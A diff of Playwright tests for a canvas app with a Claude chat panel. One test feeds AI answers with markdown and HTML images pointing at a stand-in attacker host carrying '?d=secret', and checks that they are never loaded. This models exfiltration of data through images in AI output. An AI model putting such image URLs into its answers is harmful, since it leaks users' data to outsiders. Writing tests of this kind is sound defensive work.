@@ -1117,9 +1117,10 @@ test('asks one question from the prompt box without adding it to the chat, shows
   await promptBox(page).fill('コンテキストとは？')
   await page.getByRole('button', { name: '送る' }).click()
 
-  // 会話の最後の答えを前の答えとして添えて頼む。送っても「質問」のまま
+  // 会話の最後の答えを前の答えとして添え、見ている Canvas（Claude がキャンバスを読むため）も送って頼む。送っても「質問」のまま
   await expect.poll(() => asked.length).toBe(1)
   expect(asked[0]).toMatchObject({ question: 'コンテキストとは？', previous: [{ question: 'question', answer: 'Answer from Claude' }], source: { kind: 'chat', threadId: 't1', label: 'コンテキストとは？' } })
+  expect(asked[0]!.canvasId).toBe(await page.evaluate(() => (window as any).canvcode.editor.canvasId as string))
   expect(asked[0]).not.toHaveProperty('candidates')
   await expect(mode.getByRole('radio', { name: '質問' })).toHaveAttribute('aria-checked', 'true')
   await expect(promptBox(page)).toHaveValue('')
@@ -1173,6 +1174,7 @@ test('a question asked with no conversation chosen becomes a new conversation an
   await page.getByRole('button', { name: '送る' }).click()
   await expect.poll(() => asked.length).toBe(1)
   expect(asked[0]).toMatchObject({ source: { kind: 'chat', label: '新しく聞く' } })
+  expect(asked[0]!.canvasId).toBe(await page.evaluate(() => (window as any).canvcode.editor.canvasId as string))
   expect((asked[0] as { source: object }).source).not.toHaveProperty('threadId')
   // サーバーが作った会話を選ぶ（質問だけの会話でも「読み込んでいます…」は出さない）
   await expect(page.locator('.claude-thread-name')).toHaveText('新しく聞く')
@@ -1191,4 +1193,68 @@ test('a question asked with no conversation chosen becomes a new conversation an
   await page.getByRole('button', { name: '送る' }).click()
   await expect.poll(() => started.length).toBe(1)
   expect(started[0]).toMatchObject({ prompt: 'これを表にして', threadId: id, imports: [{ label: '新しく聞く', question: '新しく聞く', answer: '答えです', questionId: id }] })
+})
+
+test('does not load outside images in the answers of the chat (jobs and questions): shows their description as a link, and does not copy them to a note (docs/question-canvas-tools-plan.md の B)', async ({ page }) => {
+  const outside: string[] = []
+  page.on('request', (request) => {
+    if (request.url().includes('evil.example')) outside.push(request.url())
+  })
+  await page.route('**://evil.example/**', (route) => route.abort())
+  const now = Date.now()
+  const job = { id: 'j2', threadId: 't1', prompt: '図を出して', status: 'done', createdAt: now + 60_000, eventCount: 1, events: [{ kind: 'text', text: 'ジョブの答え ![ジョブの図](https://evil.example/job.png?d=secret) <img src="https://evil.example/job2.png">' }] }
+  await openApp(page, { jobs: [job] })
+  const jobView = page.locator('.claude-job[data-job-id="j2"] .claude-text')
+  await expect(jobView).toContainText('ジョブの答え')
+  await expect(jobView.locator('img')).toHaveCount(0)
+  await expect(jobView.locator('a.md-image-link')).toHaveText(['画像：ジョブの図', '画像'])
+
+  // 会話の質問の答え
+  const id = '00000000-0000-4000-8000-0000000000c3'
+  const stored = { id, threadId: 't1', question: '図は？', previous: [], body: '質問の答え ![質問の図](https://evil.example/q.png?d=secret)', model: 'claude-sonnet-5-5', effort: 'medium', status: 'done', createdAt: now + 120_000, answeredAt: now + 121_000 }
+  let answered = false
+  await page.route('**/api/claude/answer', (route) => {
+    answered = true
+    const lines = [{ type: 'start', id, threadId: 't1' }, { type: 'answer', answer: { body: stored.body, related: [], model: stored.model } }]
+    return route.fulfill({ body: lines.map((line) => JSON.stringify(line)).join('\n') + '\n', contentType: 'application/x-ndjson' })
+  })
+  await page.route('**/api/claude/threads/t1', (route) => route.fulfill({ json: { jobs: [job], questions: answered ? [stored] : [] } }))
+  await page.getByRole('radiogroup', { name: '送り方' }).getByRole('radio', { name: '質問' }).click()
+  await promptBox(page).fill('図は？')
+  await page.getByRole('button', { name: '送る' }).click()
+  const item = page.locator(`.claude-question[data-question-id="${id}"]`)
+  await expect(item.locator('.claude-text')).toContainText('質問の答え')
+  await expect(item.locator('img')).toHaveCount(0)
+  await expect(item.locator('a.md-image-link')).toHaveText('画像：質問の図')
+  await expect(item.locator('a.md-image-link')).toHaveAttribute('href', 'https://evil.example/q.png?d=secret')
+
+  // 付箋に切り出しても、答えの写しに画像を写さない
+  await item.hover()
+  await item.getByRole('button', { name: '📌 付箋に切り出す' }).click()
+  const copiedTurns = () =>
+    page.evaluate((questionId) => {
+      const editor = (window as any).canvcode.editor
+      const found = editor.index.allIds().map((nodeId: string) => editor.getNode(nodeId)).find((node: any) => node?.meta?.ai?.contexts?.[0]?.questionId === questionId)
+      return found ? JSON.stringify(found.meta.ai.contexts[0].turns) : ''
+    }, id)
+  await expect.poll(copiedTurns).toContain('画像「質問の図」（https://evil.example/q.png?d=secret）')
+  const copied = await copiedTurns()
+  expect(copied).not.toContain('![')
+  await page.evaluate(() => new Promise((resolve) => setTimeout(resolve, 300)))
+  expect(outside).toEqual([])
+})
+
+test('keeps 調べる done while Claude reads the canvas again after searching the web (docs/question-canvas-tools-plan.md)', async ({ page }) => {
+  const now = Date.now()
+  // 調べたあと、キャンバスを読んでいる（読むに戻った）会話の質問
+  const running = { kind: 'chat', id: 'q-reading', threadId: 't1', label: 'この図の出典は？', status: 'running', step: 'read', searched: true, thinking: '― Web で調べる：出典\n\n― キャンバスを読む', startedAt: now + 1000 }
+  const thread = { threadId: 't1', title: 'hello', createdAt: now, updatedAt: now, jobCount: 1, running: false, tasks: [], permissions: [] }
+  const snapshot = { type: 'snapshot', threads: [thread], running: [], questions: [running] }
+  await openApp(page, { events: (route) => route.fulfill({ body: `retry: 60000\n\ndata: ${JSON.stringify(snapshot)}\n\n`, contentType: 'text/event-stream' }) })
+  const steps = page.locator('.claude-question[data-question-id="q-reading"] .answer-view-step')
+  await expect(steps).toHaveCount(3)
+  await expect(steps.nth(0)).toHaveClass(/current/)
+  await expect(steps.nth(1)).toHaveClass(/done/)
+  await expect(steps.nth(1)).toContainText('✓ 調べる')
+  await expect(steps.nth(2)).toHaveClass(/todo/)
 })
